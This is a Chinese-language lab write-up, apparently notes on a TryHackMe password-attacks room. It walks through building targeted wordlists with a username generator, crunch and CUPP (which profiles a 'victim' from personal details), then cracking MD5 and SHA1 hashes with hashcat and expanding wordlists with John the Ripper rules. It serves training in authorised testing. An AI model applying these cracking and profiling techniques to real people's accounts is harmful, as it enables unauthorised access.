+<span class="hljs-attribute">remote</span>: Compressing <span class="hljs-attribute">objects</span>: <span class="hljs-number">100%</span> (<span class="hljs-number">7</span>/<span class="hljs-number">7</span>), done.
+<span class="hljs-attribute">remote</span>: Total <span class="hljs-number">9</span> (delta <span class="hljs-number">0</span>), reused <span class="hljs-number">0</span> (delta <span class="hljs-number">0</span>), pack-reused <span class="hljs-number">0</span>
+Receiving <span class="hljs-attribute">objects</span>: <span class="hljs-number">100%</span> (<span class="hljs-number">9</span>/<span class="hljs-number">9</span>), done.
+
+user<span class="hljs-keyword">@thm</span>$ cd username_generator</code></pre>
+<p>使用 python3 username_generator.py -h 显示该工具的帮助消息和可选参数。</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/username_generator]</span>
+└─$ python username_generator<span class="hljs-selector-class">.py</span> -h                                                                                                                                         
+usage: username_generator.py [-h] -w wordlist [-u]
+
+Python script to generate user lists for bruteforcing!
+
+options:
+  -h, --help            show this help message and exit
+  -w wordlist, --wordlist wordlist
+                        Specify path to the wordlist
+  -u, --uppercase       Also produce uppercase permutations. Disabled by default</code></pre>
+<p>现在让我们创建一个包含全名 John Smith 的单词列表到文本文件中。然后，我们将运行该工具来生成给定全名的可能组合。</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/username_generator]</span>
+└─$ python username_generator<span class="hljs-selector-class">.py</span> -w users<span class="hljs-selector-class">.lst</span> 
+john
+smith
+j<span class="hljs-selector-class">.smith</span>
+j-smith
+j_smith
+j+smith
+jsmith
+johnsmith
+smithjohn
+john<span class="hljs-selector-class">.smith</span>
+smith<span class="hljs-selector-class">.john</span></code></pre>
+<p>这只是自定义用户名生成器的一个示例。请随意探索更多选项，甚至用您选择的编程语言创建自己的选项！</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217808.png" alt="image-20240714185004892"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217809.png" alt="image-20240714185010946"></p>
+<h1 id="0x04-密码分析-密钥空间技术和-cupp">0x04 密码分析- 密钥空间技术和 CUPP</h1>
+<h2 id="keyspace技术">Keyspace技术</h2>
+<p>准备单词列表的另一种方法是使用键空间技术。在这种技术中，我们在单词列表中指定一系列字符、数字和符号。 crunch 是用于创建离线单词列表的众多强大工具之一。通过 crunch，我们可以指定许多选项，包括 min、max 和选项，如下所示：</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/username_generator]</span>
+└─$ crunch -h                                                                                                                                                               
+crunch version <span class="hljs-number">3.6</span>
+
+Crunch can create <span class="hljs-selector-tag">a</span> wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.
+
+Usage: crunch &lt;min&gt; &lt;max&gt; [options]
+where min and max are numbers
+
+Please refer to the man page for instructions and examples on how to use crunch.</code></pre>
+<p>以下示例创建一个包含 2 个字符的所有可能组合（包括 0-4 和 a-d）的单词列表。我们可以使用 -o 参数并指定一个文件来保存输出。</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/username_generator]</span>
+└─$ crunch <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">01234</span>abcd -o crunch<span class="hljs-selector-class">.txt</span>
+Crunch will now generate the following amount of data: <span class="hljs-number">243</span> bytes
+<span class="hljs-number">0</span> MB
+<span class="hljs-number">0</span> GB
+<span class="hljs-number">0</span> TB
+<span class="hljs-number">0</span> PB
+Crunch will now generate the following number of lines: <span class="hljs-number">81</span> 
+
+crunch: <span class="hljs-number">100%</span> completed generating output</code></pre>
+<p>这是输出的片段：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217810.png" alt="image-20240714190413416"></p>
+<p>值得注意的是，crunch 可以生成非常大的文本文件，具体取决于您指定的字长和组合选项。以下命令创建一个最小和最大长度为 8 个字符的列表，其中包含数字 0-9、a-f 小写字母和 A-F 大写字母：</p>
+<p>crunch 8 8 0123456789abcdefABCDEF -o crunch.txt 生成的文件大小为 459 GB，包含 54875873536 个单词。</p>
+<p>crunch 还允许我们使用 -t 选项指定字符集来组合我们选择的单词。以下是一些其他选项，可用于帮助您创建不同的选择组合：</p>
+<blockquote>
+<p>@ - 小写字母字符<br>
+, - 大写字母字符<br>
+% - 数字字符<br>
+^ - 特殊字符，包括空格</p>
+</blockquote>
+<p>例如，如果我们知道密码的一部分，并且我们知道它以 pass 开头并跟随两个数字，则我们可以使用上面的 % 符号来匹配数字。这里我们生成一个单词列表，其中包含 pass 后跟 2 个数字：</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$  crunch <span class="hljs-number">6</span> <span class="hljs-number">6</span> -t pass%%
+Crunch will now generate the following amount of <span class="hljs-attribute">data</span>: <span class="hljs-number">700</span> bytes
+<span class="hljs-number">0</span> MB
+<span class="hljs-number">0</span> GB
+<span class="hljs-number">0</span> TB
+<span class="hljs-number">0</span> PB
+Crunch will now generate the following number of <span class="hljs-attribute">lines</span>: <span class="hljs-number">100</span>
+pass00
+pass01
+pass02
+pass03</code></pre>
+<h2 id="cupp-常用用户密码分析器">CUPP - 常用用户密码分析器</h2>
+<p>CUPP 是一个用 Python 编写的自动交互式工具，用于创建自定义单词列表。例如，如果您知道特定目标的一些详细信息，例如生日、宠物名、公司名称等，那么这可能是一个有用的工具，可以根据这些已知信息生成密码。 CUPP 将获取所提供的信息并根据所提供的信息生成自定义单词列表。还支持 1337/leet 模式，该模式用数字替换字母 a、i、e、t、o、s、g、z。例如，将 a 替换为 4 或将 i 替换为 1。有关该工具的更多信息，<a target="_blank" rel="noopener" href="https://github.com/Mebus/cupp">请访问此处的 GitHub 存储库</a>。</p>
+<p>要运行 CUPP，我们需要安装 python 3。然后使用 git 将 GitHub 存储库克隆到本地计算机，如下所示：</p>
+<pre><code class="hljs scss">git clone https://github.com/Mebus/cupp.git</code></pre>
+<p>现在将当前目录更改为 CUPP 并运行 python3 <a target="_blank" rel="noopener" href="http://cupp.py">cupp.py</a> 或使用 -h 查看可用选项。</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/cupp]</span>
+└─$ python cupp<span class="hljs-selector-class">.py</span> -h                                                                                                                                                       
+usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]
+
+Common User Passwords Profiler
+
+options:
+  -h, --help         show this help message and exit
+  -i, --interactive  Interactive questions for user password profiling
+  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
+  -l                 Download huge wordlists from repository
+  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which were merged and
+                     enhanced
+  -v, --version      Show the version of this program.
+  -q, --quiet        Quiet mode (don<span class="hljs-string">'t print banner)</span></code></pre>
+<p>CUPP 支持交互模式，它会询问有关目标的问题，并根据提供的答案创建自定义单词列表。如果您没有给定字段的答案，请按 Enter 键跳过它。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$  python3 cupp.py -i
+ ___________
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\
+              ||--|| *      [ Muris Kurgas | j0rgan<span class="hljs-keyword">@remote-exploit</span>.org ]
+                            [ Mebus | <span class="hljs-attribute">https</span>://github.com/Mebus/]
+
+
+[+] Insert the information about the victim to make a dictionary
+[+] If you don<span class="hljs-string">'t know all the info, just hit enter when asked! ;)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&gt; First Name: </span>
+<span class="hljs-string">&gt; Surname: </span>
+<span class="hljs-string">&gt; Nickname: </span>
+<span class="hljs-string">&gt; Birthdate (DDMMYYYY): </span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&gt; Partners) name:</span>
+<span class="hljs-string">&gt; Partners) nickname:</span>
+<span class="hljs-string">&gt; Partners) birthdate (DDMMYYYY):</span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&gt; Child'</span>s <span class="hljs-attribute">name</span>:
+&gt; Child<span class="hljs-string">'s nickname:</span>
+<span class="hljs-string">&gt; Child'</span>s birthdate (DDMMYYYY):
+
+
+&gt; Pet<span class="hljs-string">'s name:</span>
+<span class="hljs-string">&gt; Company name:</span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&gt; Do you want to add some key words about the victim? Y/[N]:</span>
+<span class="hljs-string">&gt; Do you want to add special chars at the end of words? Y/[N]:</span>
+<span class="hljs-string">&gt; Do you want to add some random numbers at the end of words? Y/[N]:</span>
+<span class="hljs-string">&gt; Leet mode? (i.e. leet = 1337) Y/[N]:</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] Now making a dictionary...</span>
+<span class="hljs-string">[+] Sorting list and removing duplicates...</span>
+<span class="hljs-string">[+] Saving dictionary to .....txt, counting ..... words.</span>
+<span class="hljs-string">&gt; Hyperspeed Print? (Y/n)</span></code></pre>
+<p>结果，会生成一个自定义单词列表，其中包含基于您的条目的各种数量的单词。预先创建的单词列表可以下载到您的计算机，如下所示：</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$  python3 cupp.py -l
+ ___________
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\
+              ||--|| *      [ Muris Kurgas | j0rgan<span class="hljs-keyword">@remote-exploit</span>.org ]
+                            [ Mebus | <span class="hljs-attribute">https</span>://github.com/Mebus/]
+
+
+        Choose the section you want to <span class="hljs-attribute">download</span>:
+
+     <span class="hljs-number">1</span>   Moby            <span class="hljs-number">14</span>      french          <span class="hljs-number">27</span>      places
+     <span class="hljs-number">2</span>   afrikaans       <span class="hljs-number">15</span>      german          <span class="hljs-number">28</span>      polish
+     <span class="hljs-number">3</span>   american        <span class="hljs-number">16</span>      hindi           <span class="hljs-number">29</span>      random
+     <span class="hljs-number">4</span>   aussie          <span class="hljs-number">17</span>      hungarian       <span class="hljs-number">30</span>      religion
+     <span class="hljs-number">5</span>   chinese         <span class="hljs-number">18</span>      italian         <span class="hljs-number">31</span>      russian
+     <span class="hljs-number">6</span>   computer        <span class="hljs-number">19</span>      japanese        <span class="hljs-number">32</span>      science
+     <span class="hljs-number">7</span>   croatian        <span class="hljs-number">20</span>      latin           <span class="hljs-number">33</span>      spanish
+     <span class="hljs-number">8</span>   czech           <span class="hljs-number">21</span>      literature      <span class="hljs-number">34</span>      swahili
+     <span class="hljs-number">9</span>   danish          <span class="hljs-number">22</span>      movieTV         <span class="hljs-number">35</span>      swedish
+    <span class="hljs-number">10</span>   databases       <span class="hljs-number">23</span>      music           <span class="hljs-number">36</span>      turkish
+    <span class="hljs-number">11</span>   dictionaries    <span class="hljs-number">24</span>      names           <span class="hljs-number">37</span>      yiddish
+    <span class="hljs-number">12</span>   dutch           <span class="hljs-number">25</span>      net             <span class="hljs-number">38</span>      exit program
+    <span class="hljs-number">13</span>   finnish         <span class="hljs-number">26</span>      norwegian
+
+
+        Files will be downloaded from <span class="hljs-attribute">http</span>://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository
+
+        <span class="hljs-attribute">Tip</span>: After downloading wordlist, you can improve it with -w option
+
+&gt; Enter <span class="hljs-attribute">number</span>:</code></pre>
+<p>根据您的兴趣，您可以从上面的列表中选择单词列表，以帮助生成用于暴力破解的单词列表！</p>
+<p>最后，CUPP 还可以使用 -a 选项从 Alecto 数据库提供默认用户名和密码。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$  python3 cupp.py -a
+ ___________
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\
+              ||--|| *      [ Muris Kurgas | j0rgan<span class="hljs-keyword">@remote-exploit</span>.org ]
+                            [ Mebus | <span class="hljs-attribute">https</span>://github.com/Mebus/]
+
+
+[+] Checking if alectodb is <span class="hljs-keyword">not</span> present...
+[+] Downloading alectodb.csv.gz from <span class="hljs-attribute">https</span>://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...
+
+[+] Exporting to alectodb-usernames.txt <span class="hljs-keyword">and</span> alectodb-passwords.txt
+[+] Done.</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217811.png" alt="image-20240714210122441"></p>
+<h1 id="0x05-离线攻击-字典和暴力破解">0x05 离线攻击 - 字典和暴力破解</h1>
+<p>本节讨论离线攻击，包括字典攻击、暴力攻击和基于规则的攻击。</p>
+<h2 id="字典攻击">字典攻击</h2>
+<p>字典攻击是一种通过使用众所周知的单词或短语来猜测密码的技术。字典攻击完全依赖于先前生成或找到的预先收集的单词列表。为了在这次攻击中取得成功，为你的目标选择或创建最佳候选单词列表非常重要。让我们探索使用您在之前有关生成单词列表的任务中学到的知识来执行字典攻击。我们将展示使用 hashcat 的离线字典攻击，hashcat 是一种流行的哈希破解工具。</p>
+<p>假设我们获得以下哈希值f806fc5a2a0d5ba2471600758452799c，并且想要执行字典攻击来破解它。首先，我们至少需要了解以下内容:</p>
+<ul>
+<li>1- 这是什么类型的哈希？</li>
+<li>2-我们将使用什么单词表？或者我们可以使用什么类型的攻击模式？</li>
+</ul>
+<p>为了识别哈希的类型，我们可以使用 hashid 或 hash-identifier 等工具。对于本例，hash-identifier 认为可能的哈希方法是 MD5。请注意，破解哈希值的时间取决于您使用的硬件（CPU 和/或 GPU）。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217812.png" alt="image-20240715165112135"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217813.png" alt="image-20240715165104105"></p>
+<p>两者对比，感觉还是第二个好点</p>
+<pre><code class="hljs scss">hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -m <span class="hljs-number">0</span> f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span></code></pre>
+<blockquote>
+<p>-a 0 设置攻击模式为字典攻击</p>
+<p>-m 0 设置破解MD5哈希值的哈希模式；对于其他类型，请运行 hashcat -h 以获取支持的哈希列表。</p>
+<p>f806fc5a2a0d5ba2471600758452799c 此选项可以是像我们的示例一样的单个哈希值，也可以是包含一个或多个哈希值的文件。</p>
+<p>/usr/share/wordlists/rockyou.txt 用于我们攻击的 wordlist/dictionary 文件</p>
+</blockquote>
+<p>如果哈希值已被破解，我们使用 --show 选项运行 hashcat 以显示破解值：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217814.png" alt="image-20240715165529503"></p>
+<p>结果破解值为rockyou</p>
+<h2 id="蛮力攻击">蛮力攻击</h2>
+<p>暴力破解是攻击者用来获取对个人帐户的未经授权的访问的常见攻击。此方法用于通过发送标准密码组合来猜测受害者的密码。字典和暴力攻击之间的主要区别在于字典攻击使用包含所有可能密码的单词列表。</p>
+<p>相反，暴力攻击旨在尝试一个或多个字符的所有组合。例如，假设我们有一个需要未经授权访问的银行帐户。我们知道PIN包含4位数字作为密码。我们可以执行从 0000 到 9999 的暴力攻击，以根据这些知识猜测有效的 PIN。在其他情况下，可以将数字或字母序列添加到列表中的现有单词中，例如 admin0admin1, … admin9999.</p>
+<p>例如，hashcat 具有可用于生成您自己的组合的字符集选项。字符集可以在 hashcat 帮助选项中找到。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hashcat --help
+ ? | Charset
+ ===+=========
+  l | abcdefghijklmnopqrstuvwxyz
+  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
+  d | <span class="hljs-number">0123456789</span>
+  h | <span class="hljs-number">0123456789</span>abcdef
+  H | <span class="hljs-number">0123456789</span>ABCDEF
+  s |  !<span class="hljs-string">"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~</span>
+<span class="hljs-string">  a | ?l?u?d?s</span>
+<span class="hljs-string">  b | 0x00 - 0xff</span></code></pre>
+<p>下面的示例展示了我们如何将 hashcat 与我们选择的暴力攻击模式结合使用。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hashcat -a <span class="hljs-number">3</span> ?d?d?d?d --stdout
+<span class="hljs-number">1234</span>
+<span class="hljs-number">0234</span>
+<span class="hljs-number">2234</span>
+<span class="hljs-number">3234</span>
+<span class="hljs-number">9234</span>
+<span class="hljs-number">4234</span>
+<span class="hljs-number">5234</span>
+<span class="hljs-number">8234</span>
+<span class="hljs-number">7234</span>
+<span class="hljs-number">6234</span>
+..
+..</code></pre>
+<blockquote>
+<p>-a 3 设置攻击方式为暴力攻击</p>
+<p>?d?d?d?d ?d 告诉 hashcat 使用数字。在我们的例子中，?d?d?d?d 表示从 0000 开始到 9999 结束的四位数字</p>
+<p>–stdout 将结果打印到终端</p>
+</blockquote>
+<p>现在让我们应用相同的概念来破解以下 MD5 哈希：05A5CF06982BA7892ED2A6D38FE832D6 一个四位数的 PIN 码。</p>
+<pre><code class="hljs scss">hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">3</span> -m <span class="hljs-number">0</span> <span class="hljs-number">05</span>A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217815.png" alt="image-20240715175232882"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217816.png" alt="image-20240715175311116"></p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/nacos-docker]</span>
+└─$ hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -m <span class="hljs-number">100</span> <span class="hljs-number">8</span>d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--show</span>
+<span class="hljs-number">8</span>d6e34f987851aa599257d3831a1af040886842f:sunshine</code></pre>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
+└─$ hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">3</span> -m <span class="hljs-number">0</span> e48e13207341b6bffb7fb1622282247b ?d?d?d?d <span class="hljs-attr">--show</span>                           
+e48e13207341b6bffb7fb1622282247b:<span class="hljs-number">1337</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217817.png" alt="image-20240715175555270"></p>
+<h1 id="0x06-离线攻击-基于规则">0x06 离线攻击 - 基于规则</h1>
+<h2 id="基于规则的攻击">基于规则的攻击</h2>
+<p>基于规则的攻击也称为混合攻击。基于规则的攻击假设攻击者了解密码策略。规则用于在给定密码策略的指导范围内创建密码，并且理论上应该只生成有效的密码。在生成符合策略的密码时，使用预先存在的单词列表可能很有用 - 例如，操纵或“修改”密码，例如“password”：p@ssword、Pa$$wordPassw0rd 等。</p>
+<p>对于这种攻击，我们可以使用 hashcat 或 John the ripper 来扩展我们的单词列表。然而，对于这次攻击，让我们看看开膛手约翰是如何工作的。通常，John the ripper 有一个包含规则集的配置文件，该文件位于 /etc/john/john.conf 或 /opt/john/john.conf，具体取决于您的发行版或 john 的安装方式。您可以阅读 /etc/john/john.conf 并查找 List.Rules 以查看所有可用规则：</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ cat /etc/john/john.conf|grep <span class="hljs-string">"List.Rules:"</span> | cut -d<span class="hljs-string">"."</span> -f3 | cut -d<span class="hljs-string">":"</span> -f2 | cut -d<span class="hljs-string">"]"</span> -f1 | awk NF
+JumboSingle
+o1
+o2
+i1
+i2
+o1
+i1
+o2
+i2
+best64
+d3ad0ne
+dive
+InsidePro
+T0XlC
+rockyou-<span class="hljs-number">30000</span>
+specific
+ShiftToggle
+Split
+Single
+Extra
+OldOffice
+Single-Extra
+Wordlist
+ShiftToggle
+Multiword
+best64
+Jumbo
+KoreLogic
+T9</code></pre>
+<p>我们可以看到我们有很多规则可供我们使用。我们将创建一个只有一个包含字符串 tryhackme 的密码的单词列表，看看如何扩展该单词列表。让我们选择一个规则，best64 规则，它包含最好的 64 条内置 John 规则，看看它能做什么！</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
+Using default input <span class="hljs-attribute">encoding</span>: UTF-<span class="hljs-number">8</span>
+Press <span class="hljs-string">'q'</span> <span class="hljs-keyword">or</span> Ctrl-C to abort, almost any other key for status
+<span class="hljs-number">76</span>p <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">100.00%</span> (<span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">11</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span>) <span class="hljs-number">1266</span>p/s pordpo
+<span class="hljs-number">76</span></code></pre>
+<blockquote>
+<p>–wordlist= 指定单词列表或词典文件。</p>
+<p>–rules 指定要使用的规则。</p>
+<p>–stdout 将输出打印到终端。</p>
+<p>|wc -l 计算 John 产生了多少行.</p>
+</blockquote>
+<p>通过运行前面的命令，我们将密码列表从 1 个密码扩展到 76 个密码。现在让我们检查另一个规则，John 中最好的规则之一，KoreLogicKoreLogic 使用各种内置和自定义规则来生成复杂的密码列表。欲了解更多信息，<a target="_blank" rel="noopener" href="https://contest-2010.korelogic.com/rules.html">请访问此网站</a>。现在让我们使用这个规则来检查 Tryh@ckm3 是否在我们的列表中可用！</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep <span class="hljs-string">"Tryh@ckm3"</span>
+Using default input <span class="hljs-attribute">encoding</span>: UTF-<span class="hljs-number">8</span>
+Press <span class="hljs-string">'q'</span> <span class="hljs-keyword">or</span> Ctrl-C to abort, almost any other key for status
+Tryh<span class="hljs-keyword">@ckm</span>3
+<span class="hljs-number">7089833</span>p <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span> <span class="hljs-number">100.00%</span> (<span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">11</span> <span class="hljs-number">13</span>:<span class="hljs-number">56</span>) <span class="hljs-number">3016</span>Kp/s tryhackme999999</code></pre>
+<p>上一个命令的输出显示我们的列表具有复杂版本的tryhackme，即Tryh@ckm3。最后，我们建议您查看所有规则并找到最适合您的规则。许多规则将组合应用于现有的单词列表并扩展单词列表以增加找到有效密码的机会！</p>
+<p>开膛手约翰可以提供很多东西。例如，我们可以构建自己的规则并在运行时使用它，而 john 正在破解哈希或使用该规则构建自定义单词列表！</p>
+<p>假设我们想要从预先存在的词典创建自定义单词列表，并对原始词典进行自定义修改。目标是在每个单词的开头添加特殊字符（例如：!@#$*&amp;），并在末尾添加数字 0-9。格式如下：</p>
+<pre><code class="hljs scss"><span class="hljs-selector-attr">[symbols]</span>word<span class="hljs-selector-attr">[0-9]</span> <span class="hljs-selector-attr">[符号]</span>单词<span class="hljs-selector-attr">[0-9]</span></code></pre>
+<p>我们可以将规则添加到 john.conf 的末尾:</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ sudo vi /etc/john/john.conf 
+[List.<span class="hljs-attribute">Rules</span>:THM-Password-Attacks] 
+Az<span class="hljs-string">"[0-9]"</span> ^[!@#$]</code></pre>
+<blockquote>
+<p>[List.Rules:THM-Password-Attacks]指定规则名称 THM-Password-Attacks。</p>
+<p>Az 使用 -p 表示原始单词列表/字典中的单个单词.</p>
+<p>“[0-9]”在单词末尾附加一个数字（从 0 到 9）。对于两位数，我们可以添<code>[0-9][0-9]</code>等。</p>
+<p>^[!@#$] 在每个单词的开头添加一个特殊字符。 ^ 表示行/单词的开头。请注意，将 ^ 更改为 $ 会将特殊字符附加到行/单词的末尾。</p>
+</blockquote>
+<p>现在让我们创建一个包含单个单词password的文件，看看如何使用此规则扩展单词列表。</p>
+<pre><code class="hljs scss">echo "password" &gt; /tmp/single<span class="hljs-selector-class">.lst</span></code></pre>
+<p>我们使用 --rules 选项在 John 命令中包含我们创建的规则的名称。我们还需要在终端中显示结果。我们可以通过使用 --stdout 来做到这一点，如下所示：</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
+Using default input <span class="hljs-attribute">encoding</span>: UTF-<span class="hljs-number">8</span> 
+!password0 
+<span class="hljs-keyword">@password</span>0 
+#password0 
+<span class="hljs-variable">$password0</span></code></pre>
+<p>现在是练习创建自己的规则的时候了。</p>
